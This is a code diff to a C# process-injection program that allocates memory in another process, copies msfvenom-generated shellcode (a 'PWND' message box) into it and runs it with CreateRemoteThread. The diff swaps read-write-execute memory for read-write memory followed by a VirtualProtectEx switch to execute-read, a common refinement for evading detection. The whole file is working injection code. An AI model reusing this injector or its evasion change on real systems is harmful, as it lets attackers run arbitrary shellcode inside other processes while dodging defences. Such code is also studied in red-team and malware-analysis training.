@@ -16,6 +16,9 @@ namespace standard
         static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
 
         [DllImport("kernel32.dll")]
+        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+        [DllImport("kernel32.dll")]
         static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
 
         static void Main(string[] args)
@@ -30,9 +33,9 @@ namespace standard
 
             // Allocate memory in remote process
             // IntPtr.Zero == NULL, API call handles locating memory space
-            // 0x3000 = MEM_COMMIT + MEM_RESERVE
-            // 0x40 = PAGE_EXECUTE_READWRITE
-            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
+            // MEM_COMMIT + MEM_RESERVE = 0x3000
+            // PAGE_READWRITE = 0x04
+            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x04);
 
             // msfvenom -p windows/x64/messagebox TEXT="PWND" -f csharp
             byte[] buf = new byte[283] {
@@ -60,6 +63,10 @@ namespace standard
             // Copy shellcode buffer to allocated memory in remote process
             IntPtr outSize;
             WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);
+
+            uint oldProtect = 0;
+            // PAGE_EXECUTE_READ = 0x20
+            VirtualProtectEx(hProcess, addr, buf.Length, 0x20, out oldProtect);
 
             // Execute shellcode in new thread
             IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
